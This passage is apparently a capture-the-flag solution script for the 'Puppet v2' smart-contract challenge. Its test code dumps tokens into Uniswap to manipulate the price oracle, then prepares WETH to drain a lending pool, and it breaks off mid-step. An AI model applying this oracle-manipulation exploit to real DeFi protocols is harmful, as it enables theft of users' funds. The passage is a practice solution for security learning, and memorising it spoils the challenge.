...
describe('[Challenge] Puppet v2', function () {
    ...
    it('Exploit', async function () {
        ...
        // approve uniswap to transfer 10000 tokens
        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        // dump the tokens in uniswap to manipulate the price
        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(ATTACKER_INITIAL_TOKEN_BALANCE, UNISWAP_INITIAL_WETH_RESERVE.div("100").mul("99"), [this.token.address, this.weth.address], attacker.address, (await ethers.provider.getBlock('latest')).timestamp * 2);
        // calculate how much weth we need to take all the tokens from the pool
        const depositRequired = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        // get the weth we need
        await this.weth.connect(attacker).deposit({ value: depositRequired });
        // approve the pool to take our weth
